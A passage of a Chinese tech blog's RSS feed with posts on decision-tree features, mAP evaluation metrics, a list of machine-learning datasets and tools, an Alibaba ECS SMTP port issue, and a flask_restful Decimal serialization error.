    &lt;a href=&#34;#4%e5%85%b6%e4%bb%96%e6%80%9d%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    4.其他思考
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;思考8：数据集有什么样的影响？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考9：数据特征有什么样的影响？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# &amp;#39;meow&amp;#39;:0, &amp;#39;wong&amp;#39;:1, &amp;#39;googooda&amp;#39;:2, &amp;#39;ga&amp;#39;:3

def create_dataset():
    features = [&amp;#39;legs&amp;#39;, &amp;#39;flippers&amp;#39;, &amp;#39;voice&amp;#39;]
    dataset = [
        [4, 0, 0, &amp;#39;cat&amp;#39;],
        [4, 0, 0, &amp;#39;cat&amp;#39;],
        [4, 0, 0, &amp;#39;cat&amp;#39;],
        [4, 0, 1, &amp;#39;dog&amp;#39;],
        [4, 0, 1, &amp;#39;dog&amp;#39;],
        [2, 0, 2, &amp;#39;chicken&amp;#39;],
        [2, 0, 2, &amp;#39;chicken&amp;#39;],
        [2, 1, 3, &amp;#39;duck&amp;#39;]
    ]
    return dataset, features
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;物种&lt;/th&gt;
&lt;th&gt;腿的数量&lt;/th&gt;
&lt;th&gt;有没有脚蹼&lt;/th&gt;
&lt;th&gt;叫声&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;猫&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;喵喵&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;狗&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;旺旺&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;鸡&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;没有&lt;/td&gt;
&lt;td&gt;咯咯哒&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;鸭&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;有&lt;/td&gt;
&lt;td&gt;嘎嘎&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;一种区分方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考10：有没有其他方法？&lt;/strong&gt;
&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/04/decision-tree/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思考11：如果使用前面的算法会得出什么样的结果呢？&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>模型评估指标</title>
      <link>/2019/03/%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87/</link>
      <pubDate>Thu, 28 Mar 2019 15:49:48 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/03/%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87/</guid>
      <description>&lt;!--toc--&gt;
&lt;!--
精确率

召回率

# AP
## step1

1. 将检测结果按照confidence排序
2. 
--&gt;
&lt;p&gt;关于mAP这篇文章写得不错：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@chih.sheng.huang821/&#34;&gt;https://medium.com/@chih.sheng.huang821/&lt;/a&gt;深度學習系列-什麼是ap-map-aaf089920848&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2019/03/TP-TF-FP-FN.jpg&#34; alt=&#34;TP-FP-FN-TN&#34;&gt;&lt;/p&gt;
&lt;p&gt;mAP定义及相关概念mAP: mean Average Precision, 即各类别AP的平均值AP: PR曲线下面积，后文会详细讲解PR曲线: Precision-Recall曲线Precision: TP / (TP + FP)Recall: TP / (TP + FN)TP: IoU&amp;gt;0.5的检测框数量（同一Ground Truth只计算一次）FP: IoU&amp;lt;=0.5的检测框，或者是检测到同一个GT的多余检测框的数量FN: 没有检测到的GT的数量&lt;/p&gt;
&lt;p&gt;mAP计算示例假设，对于Aeroplane类别，我们网络有以下输出(BB表示BoundingBox序号，IoU&amp;gt;0.5时GT=1)：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;BB  | confidence | GT
----------------------
BB1 |  0.9       | 1
----------------------
BB2 |  0.9       | 1
----------------------
BB1 |  0.8       | 1
----------------------
BB3 |  0.7       | 0
----------------------
BB4 |  0.7       | 0
----------------------
BB5 |  0.7       | 1
----------------------
BB6 |  0.7       | 0
----------------------
BB7 |  0.7       | 0
----------------------
BB8 |  0.7       | 1
----------------------
BB9 |  0.7       | 1
----------------------
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因此，我们有 TP=5 (BB1, BB2, BB5, BB8, BB9), FP=5 (重复检测到的BB1也算FP)。除了表里检测到的5个GT以外，我们还有2个GT没被检测到，因此: FN = 2. 这时我们就可以按照Confidence的顺序给出各处的PR值，如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rank=1  precision=1.00 and recall=0.14
----------
rank=2  precision=1.00 and recall=0.29
----------
rank=3  precision=0.66 and recall=0.29
----------
rank=4  precision=0.50 and recall=0.29
----------
rank=5  precision=0.40 and recall=0.29
----------
rank=6  precision=0.50 and recall=0.43
----------
rank=7  precision=0.43 and recall=0.43
----------
rank=8  precision=0.38 and recall=0.43
----------
rank=9  precision=0.44 and recall=0.57
----------
rank=10 precision=0.50 and recall=0.71
----------
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作者：知乎用户
链接：https://www.zhihu.com/question/53405779/answer/419532990
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>机器学习资料收集</title>
      <link>/2019/03/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/</link>
      <pubDate>Sat, 23 Mar 2019 23:23:28 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/03/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;框架&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a1%86%e6%9e%b6&#34;&gt;
        ##
    &lt;/a&gt;
    框架
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;tensorflow-models&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#tensorflow-models&#34;&gt;
        #
    &lt;/a&gt;
    Tensorflow models
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;tensorflow官方自带的例子：&lt;a href=&#34;https://github.com/tensorflow/models&#34;&gt;https://github.com/tensorflow/models&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;算法模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ae%97%e6%b3%95%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    算法模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;cnn&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#cnn&#34;&gt;
        #
    &lt;/a&gt;
    CNN
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://cs231n.github.io/neural-networks-case-study/#grad&#34;&gt;CS231n Convolutional Neural Networks for Visual Recognition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;lstm&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#lstm&#34;&gt;
        #
    &lt;/a&gt;
    LSTM
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://colah.github.io/posts/2015-08-Understanding-LSTMs/&#34;&gt;Understanding LSTM Networks by colah&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;数据集&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e6%8d%ae%e9%9b%86&#34;&gt;
        ##
    &lt;/a&gt;
    数据集
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;cv数据集&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#cv%e6%95%b0%e6%8d%ae%e9%9b%86&#34;&gt;
        #
    &lt;/a&gt;
    CV数据集
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;th&gt;Info&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ImageNet&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.image-net.org/about-stats&#34;&gt;http://www.image-net.org/about-stats&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~1TB，1400多万幅图片，涵盖2万多个类别，超过百万的图片有明确的类别标注和图像中物体位置的标注&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;COCO&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://cocodataset.org/#home&#34;&gt;http://cocodataset.org/#home&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~40GB，Common Object in Context&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PASCAL VOC&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://host.robots.ox.ac.uk/pascal/VOC/voc2012/index.html&#34;&gt;http://host.robots.ox.ac.uk/pascal/VOC/voc2012/index.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~2GB PASCAL VOC挑战赛是视觉对象的分类识别和检测的一个基准测试，提供了检测算法和学习性能的标准图像注释数据集和标准的评估系统。PASCAL VOC图片集包括20个目录：人类；动物（鸟、猫、牛、狗、马、羊）；交通工具（飞机、自行车、船、公共汽车、小轿车、摩托车、火车）；室内（瓶子、椅子、餐桌、盆栽植物、沙发、电视）。PASCAL VOC挑战赛在2012年后便不再举办，但其数据集图像质量好，标注完备，非常适合用来测试算法性能。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CIFAR&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.cs.toronto.edu/~kriz/cifar.html&#34;&gt;http://www.cs.toronto.edu/~kriz/cifar.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~170MB CIFAR-10包含10个类别，50,000个训练图像，彩色图像大小：32x32，10,000个测试图像。CIFAR-100与CIFAR-10类似，包含100个类，每类有600张图片，其中500张用于训练，100张用于测试；这100个类分组成20个超类。图像类别均有明确标注。CIFAR对于图像分类算法测试来说是一个非常不错的中小规模数据集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Open Image&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://github.com/openimages/dataset&#34;&gt;https://github.com/openimages/dataset&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~1.5GB（不包括图片） ，~900万张图像URL的数据集，里面的图片通过标签注释被分为6000多类。该数据集中的标签要比ImageNet（1000类）包含更真实生活的实体存在&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Youtube-8M&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://research.google.com/youtube8m/&#34;&gt;https://research.google.com/youtube8m/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;~1.5TB，来自youtube，共计8百万个视频，总时长50万小时，4800类。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;深度学习数据集收集网站&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://deeplearning.net/datasets/&#34;&gt;http://deeplearning.net/datasets/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Tiny Images Dataset&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://horatio.cs.nyu.edu/mit/tiny/data/index.html&#34;&gt;http://horatio.cs.nyu.edu/mit/tiny/data/index.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;8000万的32x32图像，CIFAR-10和CIFAR-100便是从中挑选的。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CoPhIR&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://cophir.isti.cnr.it/whatis.html&#34;&gt;http://cophir.isti.cnr.it/whatis.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;雅虎发布的超大Flickr数据集，包含1亿多张图片。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MirFlickr1M&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://press.liacs.nl/mirflickr/&#34;&gt;http://press.liacs.nl/mirflickr/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Flickr数据集中挑选出的100万图像集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SBU captioned photo dataset&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://dsl1.cewit.stonybrook.edu/~vicente/sbucaptions/&#34;&gt;http://dsl1.cewit.stonybrook.edu/~vicente/sbucaptions/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Flickr的一个子集，包含100万的图像集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NUS-WIDE&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://lms.comp.nus.edu.sg/research/NUS-WIDE.htm&#34;&gt;http://lms.comp.nus.edu.sg/research/NUS-WIDE.htm&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Flickr中的27万的图像集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Large-Scale Image Annotation using Visual Synset(ICCV 2011)&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://cpl.cc.gatech.edu/projects/VisualSynset/&#34;&gt;http://cpl.cc.gatech.edu/projects/VisualSynset/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;机器标注的一个超大规模数据集，包含2亿图像。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SUN dataset&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://people.csail.mit.edu/jxiao/SUN/&#34;&gt;http://people.csail.mit.edu/jxiao/SUN/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;包含13万的图像的数据集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MSRA-MM&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://research.microsoft.com/en-us/projects/msrammdata/&#34;&gt;http://research.microsoft.com/en-us/projects/msrammdata/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;包含100万的图像，23000视频；微软亚洲研究院出品，质量应该有保障。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LSUN：用于场景理解和多任务辅助（房间布局估计，显着性预测等）&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://lsun.cs.princeton.edu/2016/&#34;&gt;http://lsun.cs.princeton.edu/2016/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Caltech行人检测数据库&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.vision.caltech.edu/Image_Datasets/CaltechPedestrians/&#34;&gt;http://www.vision.caltech.edu/Image_Datasets/CaltechPedestrians/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;UMDFaces 人脸数据库&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;http://www.umdfaces.io/&#34;&gt;http://www.umdfaces.io/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;一共8000+个类别，总共36W张人脸图片，标注数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;李子青组的 CASIA-WebFace(50万，1万个人)&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;需申请&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MegaFace&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;华盛顿大学百万人脸MegaFace数据集，60G，邮件申请&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;南洋理工 WLFDB （Weakly Labeled Faces Database ）&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;70万+,6,025&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;微软的MSRA-CFW&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;202792 张, 1583人&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;汤晓欧实验室的CelebA&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;20万+，标注，Large-scale CelebFaces Attributes (CelebA) Dataset&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FaceScrub&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;100,100张，530人&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;搜狗实验室数据集&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;包括人物、动物、建筑、机械、风景、运动等类别，总数高达2,836,535张图片&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;标注工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%a0%87%e6%b3%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        ##
    &lt;/a&gt;
    标注工具
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;nlp-标注工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nlp-%e6%a0%87%e6%b3%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        #
    &lt;/a&gt;
    NLP 标注工具
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;| 工具 | 链接 |
|&amp;mdash;+&amp;mdash;|
| BRAT | |&lt;/p&gt;
&lt;h2 id=&#34;图像标注工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9b%be%e5%83%8f%e6%a0%87%e6%b3%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        #
    &lt;/a&gt;
    图像标注工具
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;| 工具 | 链接 | 描述 |
|&amp;mdash;+&amp;mdash;+&amp;mdash;|
| labelImg | &lt;a href=&#34;https://github.com/tzutalin/labelImg&#34;&gt;https://github.com/tzutalin/labelImg&lt;/a&gt; | |
| BBox-Label-Tool || |
| Yolo_mark | &lt;a href=&#34;https://github.com/AlexeyAB/Yolo_mark&#34;&gt;https://github.com/AlexeyAB/Yolo_mark&lt;/a&gt; | YOLO v2 标注工具|&lt;/p&gt;
&lt;h2 id=&#34;视频标注工具&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%a7%86%e9%a2%91%e6%a0%87%e6%b3%a8%e5%b7%a5%e5%85%b7&#34;&gt;
        #
    &lt;/a&gt;
    视频标注工具
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;| 工具 | 链接 |
|&amp;mdash;+&amp;mdash;|
| vatic | &lt;a href=&#34;http://web.mit.edu/vondrick/vatic/&#34;&gt;http://web.mit.edu/vondrick/vatic/&lt;/a&gt; |
| CDVA（compact descriptor for video analysis）||&lt;/p&gt;
&lt;h1 id=&#34;论文&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%ba%e6%96%87&#34;&gt;
        ##
    &lt;/a&gt;
    论文
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;cv&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#cv&#34;&gt;
        #
    &lt;/a&gt;
    CV
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Title&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;th&gt;Info&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Speed/accuracy trade-offs for modern convolutional object detectors&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://arxiv.org/pdf/1611.10012.pdf&#34;&gt;https://arxiv.org/pdf/1611.10012.pdf&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nlp&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nlp&#34;&gt;
        #
    &lt;/a&gt;
    NLP
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.singleye.net/2019/09/nlp-%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/&#34;&gt;NLP相关资源&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;书籍&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b9%a6%e7%b1%8d&#34;&gt;
        ##
    &lt;/a&gt;
    书籍
&lt;/div&gt;
&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Title&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;th&gt;Info&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Interpretable machine learning&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://christophm.github.io/interpretable-ml-book/intro.html&#34;&gt;https://christophm.github.io/interpretable-ml-book/intro.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;学习资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ad%a6%e4%b9%a0%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    学习资料
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.deeplearningbook.org&#34;&gt;MIT 经典教程 Deep Learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/9bb0bd8597a0&#34;&gt;新手 Python-机器学习 四部曲资源汇总&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Avik-Jain/100-Days-Of-ML-Code&#34;&gt;100-Days-Of-ML-Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>阿里ECS服务器使用腾讯企业邮箱发送SMTP邮件的问题</title>
      <link>/2019/01/%E9%98%BF%E9%87%8Cecs%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81smtp%E9%82%AE%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sat, 19 Jan 2019 00:39:37 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/01/%E9%98%BF%E9%87%8Cecs%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81smtp%E9%82%AE%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
      <description>&lt;p&gt;在阿里ECS上搭建的服务需要使用腾讯企业邮箱发送团队邮件，结果发现使用腾讯官方SMTP服务器配置方法无法发送成功，最后发现需要使用 587 端口才可以，这一点在官方文档里根本看不到，真是不得不吐槽啊！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/01/ecs-exmail-issue.jpeg&#34; alt=&#34;ecs-exmail-issue&#34;&gt;&lt;/p&gt;
&lt;p&gt;正确的SMTP配置是： smtp.exmail.qq.com:587&lt;/p&gt;
&lt;p&gt;另外需要注意的一点，如果需要使用外部的25端口上的SMTP服务器时需要向ECS申请开通才行，默认情况下ECS会屏蔽25端口出方向的流量。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>解决flask_restful无法对Decimal类型数据进行序列化问题</title>
      <link>/2019/01/%E8%A7%A3%E5%86%B3flask_restful%E6%97%A0%E6%B3%95%E5%AF%B9decimal%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/</link>
      <pubDate>Wed, 16 Jan 2019 12:27:13 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/01/%E8%A7%A3%E5%86%B3flask_restful%E6%97%A0%E6%B3%95%E5%AF%B9decimal%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;在使用flask进行开发的时候发现 &lt;strong&gt;Decimal&lt;/strong&gt; 类型的数据无法在作为 JSON 通过相应消息体序列化返回，出现 &lt;strong&gt;jsonschema.exceptions.ValidationError&lt;/strong&gt; 错误：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jsonschema.exceptions.ValidationError: &amp;#39;1000.00&amp;#39; is not of type &amp;#39;number&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在使用flask进行开发的时候发现 &lt;strong&gt;Decimal&lt;/strong&gt; 类型的数据无法在作为 JSON 通过相应消息体序列化返回，出现 &lt;strong&gt;jsonschema.exceptions.ValidationError&lt;/strong&gt; 错误：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jsonschema.exceptions.ValidationError: &amp;#39;1000.00&amp;#39; is not of type &amp;#39;number&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;研究 &lt;strong&gt;flask_restful/representations/json.py&lt;/strong&gt; 代码发现问题出现在 **json.dump()**中&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       7 def output_json(data, code, headers=None):
       8     &amp;#34;&amp;#34;&amp;#34;Makes a Flask response with a JSON encoded body&amp;#34;&amp;#34;&amp;#34;
       9
      10     settings = current_app.config.get(&amp;#39;RESTFUL_JSON&amp;#39;, {})
      11
             ...
      21     dumped = dumps(data, **settings) + &amp;#34;\n&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过下面实验也可以对问题得到验证。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import json
&amp;gt;&amp;gt;&amp;gt; import decimal
&amp;gt;&amp;gt;&amp;gt; json.dumps(decimal.Decimal(&amp;#39;99.99&amp;#39;))
Traceback (most recent call last):
  File &amp;#34;&amp;lt;stdin&amp;gt;&amp;#34;, line 1, in &amp;lt;module&amp;gt;
  File &amp;#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/__init__.py&amp;#34;, line 231, in dumps
    return _default_encoder.encode(obj)
  File &amp;#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py&amp;#34;, line 199, in encode
    chunks = self.iterencode(o, _one_shot=True)
  File &amp;#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py&amp;#34;, line 257, in iterencode
    return _iterencode(o, 0)
  File &amp;#34;/usr/local/Cellar/python/3.6.5_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/json/encoder.py&amp;#34;, line 180, in default
    o.__class__.__name__)
TypeError: Object of type &amp;#39;Decimal&amp;#39; is not JSON serializable
